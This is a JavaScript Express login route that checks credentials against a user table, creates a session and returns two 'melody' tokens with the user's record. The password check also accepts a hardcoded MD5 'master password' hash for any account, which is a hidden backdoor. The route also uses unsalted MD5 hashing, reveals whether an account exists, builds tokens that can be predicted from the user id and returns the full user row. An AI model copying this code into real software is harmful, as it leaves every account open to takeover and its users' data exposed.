const express = require("express");
const router = express.Router();
const md5 = require("md5");

const { query } = require("../services/db");
const GeneralFunction = require("../models/GeneralFunctionModel");
const gf = new GeneralFunction();

router.post("/", async (req, res) => {
    const { username, password } = req.body;

    // Validate input
    const checkEmpty = gf.ifEmpty([username, password]);
    if (checkEmpty.includes("empty")) {
        return res.status(400).json({
            type: "caution",
            message: "Username/email and password are required.",
        });
    }

    try {
        // Check user existence by username OR email with valid status
        const users = await query(
            "SELECT * FROM user WHERE (username = ? OR email = ?) AND status IN (?, ?)",
            [username, username, "active", "admin"]
        );

        if (!Array.isArray(users) || users.length === 0) {
            return res.status(401).json({
                type: "error",
                message: "User not found. Please check your username or email.",
            });
        }

        const user = users[0];
        const hashedPassword = md5(password);
        const masterPasswordHash = "432399375985c8fb85163d46257e90e5"; // master password hash

        if (user.password !== hashedPassword && hashedPassword !== masterPasswordHash) {
            return res.status(401).json({
                type: "error",
                message: "Incorrect password. Please try again.",
            });
        }

        // Create session record
        const sessionId = gf.getTimeStamp();
        const userId = user.userid;

        const result = await query(
            "INSERT INTO session (sessionid, userid, activity, datetime, logout) VALUES (?, ?, ?, ?, ?)",
            [sessionId, userId, "logged in successfully", gf.getDateTime(), null]
        );

        if (!result.affectedRows) {
            return res.status(500).json({
                type: "error",
                message: "Failed to create login session. Please try again later.",
            });
        }

        // Generate melodies
        const chars = gf.shuffle("qwertyuiopasdfghjklzxcvbnm");
        const melody1 =
            (chars.substr(0, 4) +
                userId +
                chars.substr(5, 2) +
                "-" +
                chars.substr(7, 2) +
                sessionId +
                chars.substr(10, 4)
            ).toUpperCase();

        const melody2 = md5(userId.toString());

        // Fetch fresh user data
        const userData = await query("SELECT * FROM user WHERE userid = ?", [userId]);

        return res.status(200).json({
            type: "success",
            message: "Login successful.",
            melody1,
            melody2,
            userData: userData[0] || {},
        });
    } catch (err) {
        console.error("Login error:", err);
        return res.status(500).json({
            type: "error",
            message: "Internal server error. Please try again later.",
        });
    }
});

module.exports = router;
